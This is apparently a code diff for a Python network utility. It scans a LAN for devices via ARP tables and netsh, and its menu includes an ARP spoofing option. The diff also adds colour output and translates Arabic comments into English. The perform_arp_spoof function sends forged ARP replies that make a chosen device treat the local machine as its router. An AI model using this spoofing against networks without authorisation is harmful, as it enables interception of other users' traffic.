@@ -2,9 +2,22 @@ import subprocess
 import re
 import socket
 import ipaddress
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from scapy.all import ARP, send
 import uuid
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+from scapy.all import ARP, send
+
+
+class Colors:
+    HEADER = "\033[95m"
+    OKBLUE = "\033[94m"
+    OKCYAN = "\033[96m"
+    OKGREEN = "\033[92m"
+    WARNING = "\033[93m"
+    FAIL = "\033[91m"
+    ENDC = "\033[0m"
+    BOLD = "\033[1m"
+    UNDERLINE = "\033[4m"
 
 def get_own_mac():
     """Retrieve the MAC address of the current machine."""
@@ -20,7 +33,7 @@ def perform_arp_spoof(target_ip, spoof_ip):
         print(f"[Error] Could not find MAC for target {target_ip}. Make sure the device is online.")
         return
     
-    # استخدام عنوان MAC الخاص بنا
+    # Use the local machine MAC address
     our_mac = get_own_mac()
     
     arp_response = ARP(
@@ -31,24 +44,23 @@ def perform_arp_spoof(target_ip, spoof_ip):
         hwsrc=our_mac         # Our own MAC address
     )
     
-    # إرسال الحزمة
+    # Send the ARP response
     send(arp_response, verbose=False)
     print(f"ARP Spoofing sent from {spoof_ip} to {target_ip} using our MAC as the router's MAC.")
 
-# يمكنك الآن استخدام هذه الدالة في main بنفس الطريقة مع الأخذ في الاعتبار أننا نستخدم MAC الخاص بنا.
+# You can now call this function in main using the local MAC address.
 
-# نحاول استعمال scapy بشكل اختياري (لو موجودة)
+# Try to use scapy optionally when available
 try:
     from scapy.all import ARP, Ether, srp
     SCAPY_AVAILABLE = True
 except Exception:
     SCAPY_AVAILABLE = False
 
-# فعّل هذا لو تحب فحص ARP نشيط بـ scapy (أبطأ شوية)
-USE_SCAPY_ACTIVE_SCAN = False  # خليه False للسرعة القصوى
+# Enable this for active ARP scanning with scapy (slightly slower)
+USE_SCAPY_ACTIVE_SCAN = False  # Keep False for fastest execution
 
-
-# --------- أدوات مساعدة عامة ---------
+# --------- General utilities ---------
 
 def run_cmd(cmd):
     """Run a command and return stdout as text."""
@@ -102,7 +114,7 @@ def get_mac_from_arp_cache(ip: str) -> str:
     return ""
 
 
-# --------- 1) قراءة ARP TABLE عن طريق arp -a ---------
+# --------- 1) Read ARP TABLE using arp -a ---------
 
 def get_from_arp_cmd():
     """
@@ -187,7 +199,7 @@ def get_from_netsh_neighbors():
     return entries
 
 
-# --------- 3) فحص ARP نشيط (اختياري) ---------
+# --------- 3) Optional active ARP scan ---------
 
 def get_local_network_cidr():
     """
@@ -244,7 +256,7 @@ def get_from_scapy_active_scan():
         return []
 
 
-# --------- 4) دمج النتائج ---------
+# --------- 4) Merge results ---------
 
 def merge_entries(*lists_of_entries):
     """
@@ -337,7 +349,7 @@ def enrich_hosts_parallel(merged):
     def task(ip):
         online = is_ip_online(ip)
 
-        # نقدر نحل الاسم حتى لو offline، لكن هذا أبطأ شوية
+        # Resolving hostnames while offline is still possible but slower
         hostname = resolve_hostname(ip)
         dev_type = guess_device_type(ip, hostname)
 
@@ -365,19 +377,34 @@ def enrich_hosts_parallel(merged):
     return info
 
 
-# --------- 6) MAIN ---------
+def print_device_table(title, devices, title_color=Colors.OKGREEN):
+    print(f"{title_color}{title}{Colors.ENDC}\n")
+    if not devices:
+        print("No devices found.\n")
+        return
 
-def main():
-    print("Scanning network (grouping ONLINE and OFFLINE devices)...\n")
+    print(
+        f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} "
+        f"{'Device Name':<35} {'Device Type':<25} {'Sources'}"
+    )
+    print("-" * 130)
+    for device in devices:
+        print(
+            f"{device['ip']:<16} {device['mac']:<20} {device['arp_type']:<10} "
+            f"{device['hostname']:<35} {device['device_type']:<25} {device['sources']}"
+        )
+    print()
+
+
+def scan_network():
+    print(f"{Colors.HEADER}Scanning network (grouping ONLINE and OFFLINE devices)...{Colors.ENDC}\n")
 
     arp_entries = get_from_arp_cmd()
     netsh_entries = get_from_netsh_neighbors()
     scapy_entries = get_from_scapy_active_scan()
 
     merged = merge_entries(arp_entries, netsh_entries, scapy_entries)
-
     all_ips = sorted(merged.keys(), key=lambda ip: list(map(int, ip.split(".")))) if merged else []
-
     hostinfo = enrich_hosts_parallel(merged)
 
     online = []
@@ -399,47 +426,64 @@ def main():
         else:
             offline.append(row)
 
-    # ------- Print ONLINE -------
-    print("=== ONLINE DEVICES ===\n")
-    if not online:
-        print("No online devices detected.\n")
-    else:
-        print(f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} {'Device Name':<35} {'Device Type':<25} {'Sources'}")
-        print("-" * 130)
-        for d in online:
-            print(
-                f"{d['ip']:<16} {d['mac']:<20} {d['arp_type']:<10} "
-                f"{d['hostname']:<35} {d['device_type']:<25} {d['sources']}"
-            )
-        print()
+    print_device_table("=== ONLINE DEVICES ===", online, title_color=Colors.OKGREEN)
+    print_device_table("=== OFFLINE / CACHED DEVICES ===", offline, title_color=Colors.WARNING)
 
-    # ------- Print OFFLINE -------
-    print("=== OFFLINE / CACHED DEVICES ===\n")
-    if not offline:
-        print("No offline/cached devices.\n")
-    else:
-        print(f"{'IP':<16} {'MAC':<20} {'ARP Type':<10} {'Device Name':<35} {'Device Type':<25} {'Sources'}")
-        print("-" * 130)
-        for d in offline:
-            print(
-                f"{d['ip']:<16} {d['mac']:<20} {d['arp_type']:<10} "
-                f"{d['hostname']:<35} {d['device_type']:<25} {d['sources']}"
-            )
-        print()
+    return online, offline
 
-    for idx, device in enumerate(online, start=1):
-        print(f"{idx}. IP: {device['ip']}, MAC: {device['mac']}, Device: {device['device_type']}")
 
-    # هنا يمكنك أن تطلب من المستخدم اختيار رقم الجهاز الذي يريد عمل Spoofing عليه
-    target_idx = int(input("اختر رقم الجهاز الذي تريد عمل Spoofing عليه: "))
-    if 1 <= target_idx <= len(online):
-        target_device = online[target_idx - 1]
-        target_ip = target_device['ip']
-        # مثلاً نقوم بـ Spoofing على الراوتر
-        router_ip = "192.168.1.1"  # غيّر هذا إلى IP الراوتر الفعلي
-        perform_arp_spoof(target_ip=target_ip, spoof_ip=router_ip)
+def prompt_for_spoof(online_devices):
+    if not online_devices:
+        print(f"{Colors.WARNING}No online devices available for spoofing. Run a scan first.{Colors.ENDC}\n")
+        return
 
-    print("DONE")
+    print(f"{Colors.OKBLUE}Select a target for ARP spoofing:{Colors.ENDC}")
+    for idx, device in enumerate(online_devices, start=1):
+        print(
+            f"{Colors.OKCYAN}{idx}. IP: {device['ip']}, MAC: {device['mac']}, "
+            f"Device: {device['device_type']}{Colors.ENDC}"
+        )
+
+    try:
+        target_idx = int(input("Enter the device number: "))
+    except ValueError:
+        print(f"{Colors.FAIL}Invalid selection. Please enter a number.{Colors.ENDC}\n")
+        return
+
+    if not 1 <= target_idx <= len(online_devices):
+        print(f"{Colors.FAIL}Selection out of range.{Colors.ENDC}\n")
+        return
+
+    target_device = online_devices[target_idx - 1]
+    target_ip = target_device["ip"]
+    router_ip = input("Enter router IP to spoof (default 192.168.1.1): ").strip() or "192.168.1.1"
+
+    perform_arp_spoof(target_ip=target_ip, spoof_ip=router_ip)
+
+
+def print_menu():
+    print(f"{Colors.BOLD}{Colors.OKBLUE}\n=== Network Utility Menu ==={Colors.ENDC}")
+    print(f"{Colors.OKGREEN}1.{Colors.ENDC} Scan network")
+    print(f"{Colors.OKGREEN}2.{Colors.ENDC} Perform ARP spoofing (requires prior scan)")
+    print(f"{Colors.OKGREEN}3.{Colors.ENDC} Exit")
+
+
+def main():
+    online_devices = []
+
+    while True:
+        print_menu()
+        choice = input("Select an option: ").strip()
+
+        if choice == "1":
+            online_devices, _ = scan_network()
+        elif choice == "2":
+            prompt_for_spoof(online_devices)
+        elif choice == "3":
+            print(f"{Colors.OKCYAN}Goodbye!{Colors.ENDC}")
+            break
+        else:
+            print(f"{Colors.FAIL}Invalid selection. Please choose 1, 2, or 3.{Colors.ENDC}\n")
 
 if __name__ == "__main__":
     main()
